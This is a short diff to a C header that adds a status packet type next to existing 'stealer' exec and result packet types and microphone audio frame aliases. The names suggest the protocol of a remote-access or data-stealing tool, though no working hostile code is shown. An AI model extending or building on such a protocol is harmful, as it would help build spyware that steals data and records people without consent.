@@ -71,6 +71,7 @@ void SendPacket(unsigned int type, const void* data, int len);
 
 #define TYPE_STEALER_EXEC 0xE0
 #define TYPE_STEALER_RESULT 0xE1
+#define TYPE_STEALER_STATUS 0xE2
 
 // Aliases for compatibility
 #define TYPE_AUDIO_MIC_DATA TYPE_AUDIO_MIC_FRAME
